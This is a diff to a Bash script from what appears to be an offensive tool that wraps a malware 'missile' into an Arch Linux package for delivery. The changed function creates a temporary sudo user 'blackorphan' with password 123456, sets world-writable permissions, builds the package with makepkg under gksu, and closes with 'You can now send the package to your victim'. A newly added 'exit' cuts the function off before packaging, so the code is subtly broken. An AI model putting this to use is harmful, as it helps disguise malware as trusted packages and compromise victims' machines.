@@ -17,7 +17,7 @@ EOF
 }
 
 createMalPkg() {
-    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
+    while printf "\n${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
 	  read $opt -e inmissile
     do
 	case $inmissile in
@@ -26,12 +26,16 @@ createMalPkg() {
 		malwareDir="malware"
 		
 		mkdir "${malwareDir}"
-		cd "$_"
-		chmod -R 777 "../${malwareDir}"
+		cd "${malwareDir}"
+
 		chk_file;
+		exit
 		packagedetails
 		mkdir "${fileName}-${vnumber}"
-		mv "${fileName}" "$_"
+		mv "${fileName}" "${fileName}-${vnumber}"
+		
+		chmod -R 777 "../${malwareDir}"
+		
 		tar -cvf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
 		rm -rf "${fileName}-${vnumber}"
 		_pkgbuild
@@ -43,60 +47,72 @@ createMalPkg() {
 			while printf "${open}${light}${green}%s: ${close}" "specify a user to package with"; read myUser junk
 			do
 
-			    [[ -z "${myUser}" ]] && myUser=blackorphan && \
-				printf "\n${open}${bold}${green}Creating user blackorpahn...${close}\n" && \
-				useradd -G sudo -s /bin/bash --password 123456 "${myUser}"
-				
+			    if [[ -z "${myUser}" ]];then
+				myUser=blackorphan
+				printf "\n${open}${bold}${green}Creating user blackorphan...${close}\n"	
+				useradd -G sudo -s /bin/bash --password 123456 "${myUser}" 2>/dev/null
 				break
+			    fi
+			    
 			    if grep ^"$myUser" < /etc/passwd ;then
 				break
 			    fi
+			    
 			    printf "\n${open}${bold}${red}Invalid User has been specified\n"
 			    continue			    
 			done
-			
-			
-			
 		    }
 		
+		
 		: ${myUser:=$(whoami)}
-		[[ "$(which bsdtar)" ]] || {
-		    printf "${open}${bold}${red}[!]bsdtar is not installed on your BoX${close}\n" && \
-			printf "${open}${bold}${yellow}[!]Trying to install bsdtar${close}" && \
-			>/dev/tcp/google.com/80
-		    [[ $? != 0 ]] && \
-			echo "${open}${light}${red}Please Check Your internet Conectivity or install bsdtar mannually${close}" && {
-			    [[ "${myUser}" == "blackorphan" ]] && {
-				userdel "${myUser}"
-				exit 2
-			    }
-			    
-			    exit 2
-			}
-		}
+
+		
+		which bsdtar 1>/dev/null
+		status=$?
+
+		
+		if (( status != 0 ));then
+
+		    printf "${open}${bold}${red}[!]bsdtar is not installed on your BoX${close}\n"
+		    printf "${open}${bold}${green}%s${close}" "How to install bsdtar"
+
+		    printf "${open}${bold}${green}\n\t%s\n\t%s\n\t%s\n${close}" \
+			   "cd libarchive-3.2.2" \
+			   "./configure" \
+			   "make && make install"
+		    
+		    [[ "${myUser}" == "blackorphan" ]] && {
+			userdel "${myUser}"
+			exit 2
+		    }
+		    
+		    exit 2;
+		    
+		fi
 		
 		gksu -u "${myUser}" "${CRYPT}/misc/makepkg -g >> PKGBUILD"
 		
 		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
+		
 		gksu -u ${myUser} "../misc/makepkg"
+
+		
 		[[ $? != 0 ]] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit 2
 		
 		[[ "${myUser}" == "blackorphan" ]] && \
 		    
-		    echo "${open}${bold}${green}Removing User BlackOrphan${close}" && \
+		    printf "${open}${bold}${green}Removing User BlackOrphan${close}" && \
 		    
 		    userdel "${myUser}"
+		
 		
 		cp ./*.pkg.* "../"
 		rm -rf "../${malwareDir}"
 		
 		printf "${open}${light}${green}Ok we are done here..${close}\n"
 		printf "${open}${light}${green}You can now send the package to your victim${close}\n"
-
-		echo ""
-		box3d
+		
 		break
-		exit
 		;;
 	    
 	    n|N)
